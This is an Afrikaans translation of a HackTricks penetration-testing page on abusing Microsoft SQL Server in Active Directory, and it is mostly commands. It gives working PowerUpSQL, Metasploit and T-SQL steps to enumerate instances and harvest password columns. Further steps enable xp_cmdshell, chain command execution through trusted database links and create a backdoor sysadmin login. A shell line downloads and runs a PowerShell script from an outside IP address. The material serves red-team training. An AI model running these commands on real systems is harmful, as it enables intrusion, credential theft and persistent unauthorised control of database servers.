# MSSQL AD Misbruik

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks in PDF af**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **MSSQL Enumerasie / Ontdekking**

Die Powershell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Enumereer vanaf die netwerk sonder 'n domein-sessie

As jy nie 'n domein-sessie het nie, kan jy steeds die netwerk ondersoek vir inligting oor die Active Directory (AD) en MSSQL-databasisse. Hier is 'n paar tegnieke wat jy kan gebruik:

1. **DNS-terugvoering**: Deur DNS-navrae te stuur na die AD-domein, kan jy inligting bekom oor die AD-struktuur en die dienste wat beskikbaar is.

2. **LDAP-navrae**: Deur LDAP-navrae te stuur na die AD-domein, kan jy inligting bekom oor gebruikers, groepe, rekenaars en ander AD-entiteite.

3. **NetBIOS-navrae**: Deur NetBIOS-navrae te stuur na die AD-domein, kan jy inligting bekom oor die AD-struktuur en die dienste wat beskikbaar is.

4. **MSSQL-verbindingsversoeke**: Deur MSSQL-verbindingsversoeke te stuur na die AD-domein, kan jy inligting bekom oor die MSSQL-databasisse wat beskikbaar is.

Dit is belangrik om hierdie tegnieke met sorg te gebruik en slegs te gebruik vir wettige doeleindes, soos pentesting of netwerkbestuur.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Enumereer van binne die domein

Om 'n aktiewe directory (AD) MSSQL-databasis te misbruik, moet jy eers binne die domein enumerateer. Hier is 'n paar metodes wat jy kan gebruik om dit te doen:

#### 1. Gebruik van nmap

Gebruik die nmap-hulpmiddel om die MSSQL-poorte in die domein te skandeer. Jy kan die volgende opdrag gebruik:

```
nmap -p 1433 --open <domein>
```

Hierdie opdrag sal die MSSQL-poorte (1433) in die gespesifiseerde domein skandeer en die oop poorte aantoon.

#### 2. Gebruik van Metasploit

Metasploit is 'n kragtige hulpmiddel wat gebruik kan word om MSSQL-databasisse te enumerateer. Jy kan die volgende opdrag gebruik om 'n Metasploit-sessie te begin:

```
msfconsole
```

Binne Metasploit kan jy die `mssql_enum`-module gebruik om die MSSQL-databasisse in die domein te enumerateer. Voer die volgende opdrag in:

```
use auxiliary/scanner/mssql/mssql_enum
```

Stel die `RHOSTS`-opsie in op die IP-adres van die MSSQL-bedieners in die domein:

```
set RHOSTS <IP-adres>
```

Voer die module uit:

```
run
```

Metasploit sal die MSSQL-databasisse in die domein enumerateer en die resultate vertoon.

#### 3. Gebruik van PowerView

PowerView is 'n nuttige PowerShell-module wat gebruik kan word om AD-inligting te enumerateer. Jy kan die volgende opdrag gebruik om PowerView te importeer:

```
Import-Module PowerView
```

Om die MSSQL-databasisse in die domein te enumerateer, kan jy die `Get-DomainSQLServer`-funksie gebruik. Voer die volgende opdrag in:

```
Get-DomainSQLServer
```

PowerView sal die MSSQL-databasisse in die domein enumerateer en die resultate vertoon.

Deur hierdie metodes te gebruik, kan jy binne die domein enumerateer en die MSSQL-databasisse identifiseer wat jy kan misbruik.
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL Basiese Misbruik

### Toegang tot DB
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Dit mag ook moontlik wees om **opdragte uit te voer** binne die MSSQL-gashouer.
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
Kyk in die bladsy wat in die **volgende afdeling genoem word hoe om dit handmatig te doen.**

### MSSQL Basiese Hacking Truuks

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## MSSQL Vertroue Skakels

As 'n MSSQL-instantie vertrou (databasis skakel) word deur 'n ander MSSQL-instantie. As die gebruiker voorregte het oor die vertroue databasis, sal hy in staat wees om **die vertroue verhouding te gebruik om navrae uit te voer in die ander instantie**. Hierdie vertroue kan geketting word en op 'n punt kan die gebruiker 'n verkeerd gekonfigureerde databasis vind waar hy opdragte kan uitvoer.

**Die skakels tussen databasisse werk selfs oor bos vertroue.**

### Powershell Misbruik
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Jy kan maklik vir vertroude skakels kyk met behulp van Metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Let daarop dat metasploit slegs die `openquery()`-funksie in MSSQL sal probeer misbruik (so, as jy nie 'n bevel kan uitvoer met `openquery()` nie, sal jy die `EXECUTE`-metode **handmatig** moet probeer om bevele uit te voer, sien meer hieronder.)

### Handmatig - Openquery()

Vanaf **Linux** kan jy 'n MSSQL-konsoleskulp verkry met **sqsh** en **mssqlclient.py.**

Vanaf **Windows** kan jy ook die skakels vind en bevele handmatig uitvoer met 'n **MSSQL-kliënt soos** [**HeidiSQL**](https://www.heidisql.com)

_Meld aan met Windows-verifikasie:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Vind Vertrouenswaardige Skakels
```sql
select * from master..sysservers
```
![](<../../.gitbook/assets/image (168).png>)

#### Voer navrae uit in 'n betroubare skakel

Voer navrae uit deur die skakel (voorbeeld: vind meer skakels in die nuwe toeganklike instansie):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Kyk waar dubbele en enkele aanhalingstekens gebruik word, dit is belangrik om hulle op daardie manier te gebruik.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Jy kan hierdie vertroude skakelketting vir ewig handmatig voortgaan.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
As jy nie aksies soos `exec xp_cmdshell` vanaf `openquery()` kan uitvoer nie, probeer met die `EXECUTE`-metode.

### Handleiding - EXECUTE

Jy kan ook vertroude skakels misbruik deur `EXECUTE` te gebruik:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Plaaslike Privilege Escalation

Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "as 'n kliënt op te tree na verifikasie".

'n Strategie wat deur baie skrywers bedink is, is om 'n SYSTEM-diens te dwing om te verifieer by 'n bedrieglike of man-in-die-middel-diens wat die aanvaller skep. Hierdie bedrieglike diens kan dan optree as die SYSTEM-diens terwyl dit probeer verifieer.

[SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word deur middel van Beacon se `execute-assembly`-opdrag.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
